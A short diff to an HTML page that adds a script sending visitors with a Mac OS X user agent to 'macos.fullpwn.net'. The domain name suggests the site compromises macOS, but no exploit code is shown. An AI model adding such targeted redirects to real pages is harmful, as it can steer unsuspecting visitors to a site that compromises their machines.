@@ -21,4 +21,11 @@ h1, h2, h3, p, a {
     <center><h2>Please visit this link on a Mac and try again.</h2></center>
     
 </body>
+    <script>
+if (navigator.userAgent.indexOf('Mac OS X') != -1) {
+  location.href = "https://macos.fullpwn.net/"
+} else {
+  console.log("Confirmed device is not a Mac.")
+}
+    </script>
 </html>
